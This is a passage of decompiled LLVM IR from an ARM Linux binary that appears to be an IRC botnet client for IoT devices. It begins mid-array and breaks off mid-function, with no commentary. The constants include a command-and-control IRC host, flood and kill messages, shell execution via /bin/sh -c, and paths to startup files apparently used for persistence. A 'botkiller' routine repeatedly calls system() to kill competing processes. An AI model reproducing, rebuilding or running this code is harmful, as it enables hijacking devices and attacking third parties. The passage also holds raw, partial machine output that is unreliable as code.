i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12ea0.164, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12ea8.165, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12eb0.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12ebc.167, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12ec8.168, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12ed4.169, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12ee4.170, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12ef4.171, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12f04.172, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12f14.173, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12f20.174, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12f2c.175, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_12f3c.176, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12f4c.177, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12f5c.178, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12f6c.179, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_12f78.180, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_12f88.181, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12f9c.182, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12fa8.183, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12fb4.184, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12fc4.185, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12fd4.186, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_129c4.47, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12fe0.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_12fec.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_12ff4.189, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_12ffc.190, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13004.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1300c.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13014.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1301c.194, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13024.195, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1302c.196, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13034.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1303c.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13044.199, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1304c.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13054.201, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1305c.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13064.203, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1306c.204, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13074.205, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1307c.206, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13084.207, i32 0, i32 0), i8* bitcast (i32* @global_var_1308c.208 to i8*), i8* bitcast (i32* @global_var_13090.209 to i8*), i8* bitcast (i32* @global_var_13094.210 to i8*), i8* bitcast (i32* @global_var_13098.211 to i8*), i8* bitcast (i32* @global_var_1309c.212 to i8*), i8* bitcast (i32* @global_var_130a0.213 to i8*), i8* bitcast (i32* @global_var_130a4.214 to i8*), i8* bitcast (i32* @global_var_130a8.215 to i8*), i8* bitcast (i32* @global_var_130ac.216 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130b0.217, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130b4.218, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130b8.219, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130bc.220, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130c0.221, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130c4.222, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130c8.223, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130cc.224, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130d0.225, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130d4.226, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130d8.227, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_130dc.228, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_130e0.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_130ec.230, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_130f4.231, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_130fc.232, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13104.233, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13108.234, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1310c.235, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13110.236, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13114.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13118.238, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1311c.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13120.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_13124.241, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13128.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1312c.243, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13130.244, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13134.245, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13138.246, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1313c.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13140.248, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13144.249, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13148.250, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1314c.251, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13158.252, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13160.253, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13168.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13170.255, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_13178.256, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13180.257, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13188.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13190.259, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13198.260, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_131a4.261, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_131ac.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_131b4.263, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_131c0.264, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_131c8.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_131d0.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_131d8.267, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_131e0.268, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_131e8.269, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_131f0.270, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_131f8.271, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13204.272, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1320c.273, i32 0, i32 0)]
@global_var_1dc00.282 = global i32 0
@global_var_1d7fc.286 = local_unnamed_addr global i32 0
@global_var_1fe74.288 = global i32 0
@global_var_1324c.290 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1325c.292 = constant i32 114
@global_var_1fe50.294 = global i32 0
@global_var_13260.296 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_1327c.298 = constant [4 x i8] c"std\00"
@global_var_1fe70.301 = local_unnamed_addr global i32 0
@global_var_13280.303 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_132a0.307 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_13244.309 = constant [6 x i8] c"pices\00"
@global_var_132c0.310 = constant [4 x i8] c"STD\00"
@global_var_1d408.311 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13244.309, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_132c0.310, i32 0, i32 0)]
@global_var_1fe58.314 = global i32 0
@global_var_13304.316 = constant i32 0
@global_var_1d40c.318 = global [4 x i8]* @global_var_132c0.310
@global_var_13308.321 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_1fe6c.324 = local_unnamed_addr global i32 0
@global_var_13318.326 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_13328.328 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_13330.330 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1d7f8.333 = global i32 0
@global_var_1333c.341 = constant [16 x i8] c"[linux][armv5l]\00"
@global_var_1fe5c.343 = global i32 0
@global_var_1d7ec.345 = global i32 0
@global_var_1d3fc.347 = local_unnamed_addr global i32 1
@global_var_1322c.349 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_1d400.350 = global [22 x i8]* @global_var_1322c.349
@global_var_1fe64.352 = global i32 0
@global_var_1336c.354 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_13380.357 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_13390.359 = constant i32 47
@global_var_13394.361 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1339c.363 = constant i32 97
@global_var_133a0.365 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_1fe60.370 = local_unnamed_addr global i32 0
@global_var_133b0.373 = constant i32 35
@global_var_133b4.376 = constant i32 0
@global_var_1fe54.378 = local_unnamed_addr global i32 0
@global_var_133b8.382 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_133c4.384 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_133f0.388 = constant i32 10
@global_var_1334c.390 = constant [4 x i8] c"352\00"
@global_var_1d434.391 = global [4 x i8]* @global_var_1334c.390
@global_var_133f4.393 = constant [6 x i8] c"ERROR\00"
@global_var_1fe18.395 = global i32 0
@global_var_1d470 = external local_unnamed_addr global i32
@global_var_1fe28.402 = global i32 0
@global_var_1d4a4.408 = global i32 0
@global_var_1dc04.410 = global i32 0
@global_var_d4a4.412 = constant i32 -481296384
@global_var_ae08.413 = constant i32 -442564544
@global_var_1dc08.415 = global i32 0
@global_var_1d4bc.421 = global i32 2
@global_var_1d48c.427 = global i32 0
@global_var_b1d0.428 = constant i32 -442564492
@global_var_1d488.430 = global i32* bitcast (i8** @global_var_1d4c0.398 to i32*)
@global_var_136fc.436 = constant i32 0
@global_var_b390.441 = constant i32 -382910448
@global_var_ee04.442 = constant i32 -382909968
@global_var_eec0.443 = constant i32 -382910224
@global_var_13730.445 = constant i32 135270416
@global_var_13714.447 = constant [6 x i8] c"(nil)\00"
@global_var_1371c.450 = constant [7 x i8] c"(null)\00"
@global_var_13724.452 = constant i32 2949163
@global_var_137b0.455 = constant i32 16843008
@global_var_13798.457 = constant i32 327688
@global_var_1d7a4 = external global i32
@global_var_1476a.462 = constant i32 65536
@global_var_13790.464 = constant [8 x i8] c" +0-#'I\00"
@global_var_13738.466 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_13778.468 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1376b.470 = constant i32 117506048
@global_var_1376c.472 = constant i32 252117248
@global_var_1375c.474 = constant i32 331776
@global_var_1374c.476 = constant i32 335616
@global_var_c8dc.508 = constant i32 -456978431
@global_var_137cc.512 = constant [8 x i8] c"Success\00"
@global_var_137bc.514 = constant [15 x i8] c"Unknown error \00"
@global_var_1d7ac.516 = global i32* @global_var_1476a.462
@global_var_1fc0c.518 = global i32 0
@global_var_1fddc.521 = global i32 0
@global_var_1fc10.523 = global i32 0
@global_var_1d7b4.525 = global i32 0
@global_var_1feac.530 = global i32 0
@global_var_1fea0.533 = global i32 0
@global_var_1fdf0.535 = global i32 0
@global_var_1d6ac.538 = global i32 256
@global_var_1d5b0.539 = global i32* @global_var_1d6ac.538
@global_var_1fe78.543 = global i32 0
@global_var_ebf4.544 = constant i32 -382910416
@global_var_d524.551 = constant i32 -442564520
@global_var_1d6b8.557 = global i32 0
@global_var_ec4c.559 = constant i32 -481230848
@global_var_1fe08.561 = global i32 0
@global_var_ea58.563 = constant i32 -509587456
@global_var_1d6d0.565 = global i32 0
@global_var_1d6e8 = external global i32
@global_var_1d708.571 = global i32 -1726662223
@global_var_1d6f0.578 = local_unnamed_addr global i32* @global_var_1d708.571
@global_var_1d6ec.580 = global i32* @global_var_1d708.571
@global_var_14328.594 = constant i32 0
@global_var_1f31d.598 = global i32 0
@global_var_14350.602 = constant [8 x i8] c"/bin/sh\00"
@global_var_14358.604 = constant [3 x i8] c"sh\00"
@global_var_1435c.606 = constant [3 x i8] c"-c\00"
@global_var_1d784.610 = global i32 0
@global_var_1fe0c.614 = local_unnamed_addr global i32 0
@global_var_b2d8.617 = constant i32 -382910416
@global_var_1fe14.619 = global i32 0
@global_var_1d000.622 = global i32 -1
@global_var_1fe1c.625 = global i32 0
@global_var_1fe20.627 = local_unnamed_addr global i32 0
@global_var_e548.628 = constant i32 -390234096
@global_var_14360.630 = constant [10 x i8] c"/dev/null\00"
@global_var_1fe24.632 = global i32 0
@global_var_b258.636 = constant i32 -382909968
@global_var_1fe10.638 = local_unnamed_addr global i32 0
@global_var_c850.641 = constant i32 -369095538
@global_var_1d79c = external local_unnamed_addr global i32
@global_var_acd4.652 = constant i32 -442564608
@global_var_e810.654 = constant i32 -335544701
@global_var_e960.657 = constant i32 -275775369
@global_var_1fe4c.660 = global i32 0
@global_var_1fe2c.662 = global i32 0
@global_var_1496c.664 = constant [4 x i8] c"inf\00"
@global_var_1496f.668 = constant i32 1179535616
@global_var_1497c.670 = constant i32 2883630
@global_var_c4e4.672 = constant i32 -382908944
@global_var_1fe30.680 = global i32 0
@global_var_1fe48.685 = local_unnamed_addr global i32 0
@global_var_a9f4.690 = constant i32 -382910448
@global_var_1feb0.693 = global i32 0
@global_var_149c8.695 = constant i32 46
@global_var_1fe90.697 = global i32 0
@global_var_10914.699 = constant i32 -369098656
@global_var_149cc.706 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_149e0.708 = constant i32 114
@global_var_149e4.710 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_149fc.713 = constant [11 x i8] c"nameserver\00"
@global_var_14a08.716 = constant [7 x i8] c"domain\00"
@global_var_14a10.718 = constant [7 x i8] c"search\00"
@global_var_1feb4.723 = global i32 0
@global_var_1ff34.725 = global i32 0
@global_var_1ff38.727 = global i32 0
@global_var_14a2c.736 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_14a18.738 = constant i32 0
@global_var_14a40.741 = constant [3 x i8] c"%x\00"
@global_var_14a44.744 = constant [11 x i8] c"/etc/hosts\00"
@global_var_14a50.746 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1d004.752 = global i32 0
@global_var_1d7d0.5 = external global i8*
@global_var_1d800.280 = external global i8*
@global_var_1d7f0.284 = external local_unnamed_addr global i8*
@global_var_1d7f4.335 = external local_unnamed_addr global i8*
@global_var_1d7f7.336 = external local_unnamed_addr global i8*
@global_var_1d7f6.337 = external local_unnamed_addr global i8*
@global_var_1d7f5.338 = external local_unnamed_addr global i8*
@1 = internal constant [3 x i8] c" \01\00"
@global_var_1d4c0.398 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @1, i32 0, i32 0)
@global_var_1d510.399 = local_unnamed_addr global i8 16
@global_var_e55c.404 = constant i8 0
@global_var_1d4c1.433 = local_unnamed_addr global i8 1
@global_var_1d511.434 = local_unnamed_addr global i8 1
@2 = internal constant [2 x i8] c"\01\00"
@global_var_1d7b0.687 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_1d7b1.688 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1d7d0.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1d7d0.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1d01c.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1d01c.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1d01c.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1d01c.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1d7d0.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1d01c.8, { 1, 0 }
  uselistorder i8** @global_var_1d7d0.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_1d010.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_1d010.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_1d010.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_1d010.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_9ee0.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 76068, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_81d8 = ptrtoint i8** %stack_var_-100 to i32
  %v2_8224 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_81dc

dec_label_pc_81dc:                                ; preds = %dec_label_pc_828c, %entry
  br label %dec_label_pc_81e8

dec_label_pc_81e8:                                ; preds = %dec_label_pc_81dc, %dec_label_pc_81e8
  %storemerge45 = phi i32 [ 0, %dec_label_pc_81dc ], [ %v1_8278, %dec_label_pc_81e8 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_8214 = mul nuw nsw i32 %storemerge45, 4
  %v5_8214 = add i32 %v4_8214, ptrtoint ([246 x i8*]* @global_var_1d024.274 to i32)
  %v6_8214 = inttoptr i32 %v5_8214 to i32*
  %v7_8214 = load i32, i32* %v6_8214, align 4
  store i32 %v7_8214, i32* @r1, align 4
  %v3_8224 = call i32 @strcat(i8* %v2_8224, i32 %v7_8214)
  %v1_8230 = call i32 @__libc_system(i32 %v2_81d8)
  store i8* inttoptr (i32 1819044203 to i8*), i8** %stack_var_-100, align 4
  %v7_8254 = load i32, i32* %v6_8214, align 4
  store i32 %v7_8254, i32* @r1, align 4
  %v3_8264 = call i32 @strcat(i8* %v2_8224, i32 %v7_8254)
  %v1_8270 = call i32 @__libc_system(i32 %v2_81d8)
  %v1_8278 = add nuw nsw i32 %storemerge45, 1
  %v7_8288 = icmp slt i32 %v1_8278, 9
  br i1 %v7_8288, label %dec_label_pc_81e8, label %dec_label_pc_828c

dec_label_pc_828c:                                ; preds = %dec_label_pc_81e8
  %v1_8290 = call i32 @sleep(i32 5)
  br label %dec_label_pc_81dc

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder label %dec_label_pc_81e8, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_82a8 = load i32, i32* @r4, align 4
  %v6_82a8 = load i32, i32* @fp, align 4
  store i32 33456, i32* %stack_var_-4, align 4
  %v2_82ac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_82ac, i32* @fp, align 4
  %v2_82c0 = load i8, i8* %arg1, align 1
  %v7_82cc = icmp eq i8 %v2_82c0, 42
  br i1 %v7_82cc, label %dec_label_pc_8300, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %entry
  %v7_82d8 = icmp eq i8 %v2_82c0, 63
  br i1 %v7_82d8, label %dec_label_pc_8370, label %dec_label_pc_82e0

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82d4
  %v2_82e4 = icmp eq i8 %v2_82c0, 0
  br i1 %v2_82e4, label %dec_label_pc_82f0, label %dec_label_pc_83c8

dec_label_pc_82f0:                                ; preds = %dec_label_pc_82e0
  %v2_82f4 = load i8, i8* %tmp, align 1
  %v3_82f4 = zext i8 %v2_82f4 to i32
  br label %dec_label_pc_843c

dec_label_pc_8300:                                ; preds = %entry
  %v1_8304 = add i32 %tmp9, 1
  %v3_8310 = inttoptr i32 %v1_8304 to i8*
  %v4_8310 = call i32 @strwildmatch(i8* %v3_8310, i32 %arg2)
  %v2_8318 = icmp eq i32 %v4_8310, 0
  br i1 %v2_8318, label %dec_label_pc_835c, label %dec_label_pc_8320

dec_label_pc_8320:                                ; preds = %dec_label_pc_8300
  %v2_8324 = load i8, i8* %tmp, align 1
  %v2_8328 = icmp eq i8 %v2_8324, 0
  br i1 %v2_8328, label %dec_label_pc_8364, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %dec_label_pc_8320
  %v1_8334 = add i32 %arg2, 1
  %v4_8340 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8334)
  %v2_8348 = icmp eq i32 %v4_8340, 0
  br i1 %v2_8348, label %dec_label_pc_835c, label %dec_label_pc_8364

dec_label_pc_835c:                                ; preds = %dec_label_pc_8330, %dec_label_pc_8300
  br label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_8320, %dec_label_pc_8330, %dec_label_pc_835c
  %storemerge4 = phi i32 [ 0, %dec_label_pc_835c ], [ 1, %dec_label_pc_8330 ], [ 1, %dec_label_pc_8320 ]
  br label %dec_label_pc_843c

dec_label_pc_8370:                                ; preds = %dec_label_pc_82d4
  %v2_8374 = load i8, i8* %tmp, align 1
  %v2_8378 = icmp eq i8 %v2_8374, 0
  br i1 %v2_8378, label %dec_label_pc_83bc, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8384 = add i32 %tmp9, 1
  %v1_838c = add i32 %arg2, 1
  %v2_8398 = inttoptr i32 %v1_8384 to i8*
  %v3_8398 = call i32 @strwildmatch(i8* %v2_8398, i32 %v1_838c)
  %v2_83a0 = icmp ne i32 %v3_8398, 0
  %. = zext i1 %v2_83a0 to i32
  br label %dec_label_pc_83bc

dec_label_pc_83bc:                                ; preds = %dec_label_pc_8380, %dec_label_pc_8370
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8370 ], [ %., %dec_label_pc_8380 ]
  br label %dec_label_pc_843c

dec_label_pc_83c8:                                ; preds = %dec_label_pc_82e0
  %v2_83cc = load i8, i8* %arg1, align 1
  %v3_83cc = zext i8 %v2_83cc to i32
